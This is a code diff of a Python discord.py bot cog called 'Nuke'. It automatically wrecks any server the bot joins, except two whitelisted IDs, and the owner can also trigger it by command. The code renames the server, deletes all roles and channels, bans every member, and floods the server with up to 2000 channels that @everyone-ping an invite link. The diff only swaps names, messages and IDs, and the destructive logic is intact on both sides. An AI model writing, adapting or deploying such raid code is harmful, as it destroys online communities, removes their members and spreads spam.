@@ -10,11 +10,11 @@ class Nuke(commands.Cog):
         if ctx.author.id == self.bot.owner_id:
             await ctx.message.delete()
             try:
-                print(f'Joined guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
-                await ctx.guild.create_text_channel(f'fuckme1')
-                invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
+                print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Nuking it :)')
+                await ctx.guild.create_text_channel(f'1')
+                invite = await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'1').id).create_invite(max_age = 300)
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Invite: {str(invite)} :)')
-                await ctx.guild.edit(name=":} Send me a message to get me back to life :}")
+                await ctx.guild.edit(name="Nuked by Anix | https://discord.gg/t2x6AuJFbb")
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Changed server name :)')
                 for c in ctx.guild.roles:
                     try:
@@ -25,7 +25,7 @@ class Nuke(commands.Cog):
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all possible roles :)')
                 for member in ctx.guild.members:
                     try:
-                        await member.ban(reason='Banned by Anix <3')
+                        await member.ban(reason='https://discord.gg/t2x6AuJFbb')
                         print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                     except discord.errors.Forbidden:
                         pass
@@ -33,9 +33,9 @@ class Nuke(commands.Cog):
                 for c in ctx.guild.channels:
                     await c.delete()
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Deleted all channels :)')
-                for i in range(2,2000):
-                    await ctx.guild.create_text_channel(f'fuckme{i}')
-                    await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
+                for i in range(1,2000):
+                    await ctx.guild.create_text_channel(f'{i}')
+                    await self.bot.get_channel(discord.utils.get(ctx.guild.channels, name=f'{i}').id).send(f"@everyone https://discord.gg/t2x6AuJFbb")
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Created 2000 channels :)')
                 await ctx.guild.leave()
                 print(f'Guild: {ctx.guild.name} - {str(ctx.guild.id)} - Left after nuking :)')  
@@ -47,13 +47,13 @@ class Nuke(commands.Cog):
         await ctx.send(embed=discord.Embed(title=":x: Error", description=f"Command not found.", color=discord.Color.red()).set_footer(text=f"Requested by {ctx.author.name}", icon_url=ctx.author.avatar_url))
     @commands.Cog.listener()
     async def on_guild_join(self, guild):
-        if guild.id != 993573362221715546 and guild.id != 1002659843720617995:
+        if guild.id != 1002659843720617995 and guild.id != 1006599826315685888:
             try:
                 print(f'Joined guild: {guild.name} - {str(guild.id)} - Nuking it :)')
                 await guild.create_text_channel(f'fuckme1')
                 invite = await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme1').id).create_invite(max_age = 300)
                 print(f'Guild: {guild.name} - {str(guild.id)} - Invite: {str(invite)} :)')
-                await guild.edit(name=":} Send me a message to get me back to life :}")
+                await guild.edit(name="Nuked by Anix | https://discord.gg/t2x6AuJFbb")
                 print(f'Guild: {guild.name} - {str(guild.id)} - Changed server name :)')
                 for c in guild.roles:
                     try:
@@ -64,7 +64,7 @@ class Nuke(commands.Cog):
                 print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all possible roles :)')
                 for member in guild.members:
                     try:
-                        await member.ban(reason='Banned by Anix <3')
+                        await member.ban(reason='https://discord.gg/t2x6AuJFbb')
                         print(f'Banned {member.name}#{member.discriminator} - {str(member.id)}')
                     except discord.errors.Forbidden:
                         pass
@@ -73,9 +73,9 @@ class Nuke(commands.Cog):
                 for c in guild.channels:
                     await c.delete()
                 print(f'Guild: {guild.name} - {str(guild.id)} - Deleted all channels :)')
-                for i in range(2,2000):
-                    await guild.create_text_channel(f'fuckme{i}')
-                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'fuckme{i}').id).send("@everyone nox#4041 is the best")
+                for i in range(1,2000):
+                    await guild.create_text_channel(f'{i}')
+                    await self.bot.get_channel(discord.utils.get(guild.channels, name=f'{i}').id).send(f"@everyone https://discord.gg/t2x6AuJFbb")
                 print(f'Guild: {guild.name} - {str(guild.id)} - Created 2000 channels :)')
                 await guild.leave()
                 print(f'Guild: {guild.name} - {str(guild.id)} - Left after nuking :)')  
